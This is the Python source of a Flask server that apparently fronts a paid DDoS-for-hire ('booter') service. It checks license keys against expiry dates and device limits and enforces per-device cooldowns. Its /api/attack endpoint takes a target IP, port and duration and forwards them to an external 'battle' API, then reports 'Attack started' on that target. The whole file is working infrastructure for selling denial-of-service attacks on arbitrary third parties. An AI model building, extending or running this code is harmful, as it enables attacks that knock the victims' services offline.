from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time
import json
import os
import threading

app = Flask(__name__)
CORS(app)

# ========== READ FROM ENVIRONMENT VARIABLES ==========
BATTLE_API_URL = os.environ.get('BATTLE_API_URL')
BATTLE_API_KEY = os.environ.get('BATTLE_API_KEY')

if not BATTLE_API_URL:
    print("❌ ERROR: BATTLE_API_URL environment variable not set!")
    exit(1)

if not BATTLE_API_KEY:
    print("❌ ERROR: BATTLE_API_KEY environment variable not set!")
    exit(1)

print(f"✅ Loaded BATTLE_API_URL: {BATTLE_API_URL}")
print(f"✅ Loaded BATTLE_API_KEY: {BATTLE_API_KEY[:20]}...")

# ========== JSON DATA STORAGE ==========
DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
ACTIVE_SESSIONS_FILE = os.path.join(DATA_DIR, "active_sessions.json")

def load_json(file_path, default=None):
    if default is None:
        default = {}
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=2, default=str)

def get_keys():
    return load_json(KEYS_FILE, {})

def get_active_sessions():
    return load_json(ACTIVE_SESSIONS_FILE, {})

def save_active_sessions(sessions):
    save_json(ACTIVE_SESSIONS_FILE, sessions)

# ========== IN-MEMORY STORAGE ==========
cooldowns = {}
active_attacks = {}

def verify_key(key, device_id):
    keys = get_keys()
    
    if key not in keys:
        return {"valid": False, "reason": "Key not found"}
    
    key_data = keys[key]
    expiry_ts = key_data.get('expiry_at', 0)
    is_active = key_data.get('is_active', 0)
    device_limit = key_data.get('device_limit', 1)
    now = int(time.time() * 1000)
    
    if is_active == 0:
        return {"valid": False, "reason": "Key has been deleted"}
    
    if expiry_ts < now:
        return {"valid": False, "reason": "Key expired"}
    
    sessions = get_active_sessions()
    current_devices = sessions.get(key, {})
    
    # Check device limit
    active_count = len(current_devices) if isinstance(current_devices, dict) else 0
    
    if device_id not in current_devices:
        if active_count >= device_limit:
            return {"valid": False, "reason": f"Key has reached maximum device limit ({device_limit})"}
    
    # Update session
    if key not in sessions:
        sessions[key] = {}
    
    sessions[key][device_id] = {
        'login_time': now,
        'last_active': now
    }
    save_active_sessions(sessions)
    
    return {"valid": True, "expiry": expiry_ts}

def check_cooldown(device_id):
    now = time.time()
    if device_id in cooldowns and now < cooldowns[device_id]:
        return {"can_attack": False, "remaining": int(cooldowns[device_id] - now)}
    return {"can_attack": True}

def set_cooldown(device_id):
    cooldowns[device_id] = time.time() + 60

def check_active_attack(device_id):
    if device_id in active_attacks and active_attacks[device_id] > time.time():
        return {"can_attack": False}
    return {"can_attack": True}

def start_attack(device_id, duration):
    active_attacks[device_id] = time.time() + duration
    def cleanup():
        time.sleep(duration)
        if device_id in active_attacks:
            del active_attacks[device_id]
    threading.Thread(target=cleanup, daemon=True).start()

@app.route('/api/verify-key', methods=['POST'])
def verify_key_endpoint():
    data = request.get_json()
    key = data.get('key')
    device_id = data.get('device_id')
    
    result = verify_key(key, device_id)
    
    if result["valid"]:
        return jsonify({"success": True, "expiry": result["expiry"]})
    else:
        return jsonify({"success": False, "reason": result["reason"]}), 401

@app.route('/api/attack', methods=['POST'])
def attack_endpoint():
    data = request.get_json()
    key = data.get('key')
    device_id = data.get('device_id')
    ip = data.get('ip')
    port = data.get('port')
    duration = data.get('duration')
    
    if not all([key, device_id, ip, port, duration]):
        return jsonify({"success": False, "reason": "Missing parameters"}), 400
    
    try:
        duration = int(duration)
        if duration < 1 or duration > 300:
            return jsonify({"success": False, "reason": "Duration must be 1-300 seconds"}), 400
    except:
        return jsonify({"success": False, "reason": "Invalid duration"}), 400
    
    key_result = verify_key(key, device_id)
    if not key_result["valid"]:
        return jsonify({"success": False, "reason": key_result["reason"]}), 401
    
    if not check_active_attack(device_id)["can_attack"]:
        return jsonify({"success": False, "reason": "You already have an attack running"}), 429
    
    cooldown_check = check_cooldown(device_id)
    if not cooldown_check["can_attack"]:
        return jsonify({"success": False, "reason": f"Cooldown: Wait {cooldown_check['remaining']} seconds"}), 429
    
    try:
        headers = {"x-api-key": BATTLE_API_KEY, "Content-Type": "application/json"}
        payload = {"ip": ip, "port": port, "duration": duration}
        
        response = requests.post(BATTLE_API_URL, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            start_attack(device_id, duration)
            set_cooldown(device_id)
            return jsonify({"success": True, "message": f"Attack started on {ip}:{port} for {duration} seconds"})
        else:
            return jsonify({"success": False, "reason": f"API error: {response.status_code}"}), 500
    except Exception as e:
        return jsonify({"success": False, "reason": str(e)}), 500

@app.route('/api/logout', methods=['POST'])
def logout_endpoint():
    data = request.get_json()
    key = data.get('key')
    device_id = data.get('device_id')
    
    sessions = get_active_sessions()
    if key in sessions:
        if device_id and device_id in sessions[key]:
            del sessions[key][device_id]
            if len(sessions[key]) == 0:
                del sessions[key]
        else:
            del sessions[key]
        save_active_sessions(sessions)
    
    return jsonify({"success": True})

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

if __name__ == '__main__':
    port = 5001
    app.run(host='0.0.0.0', port=port)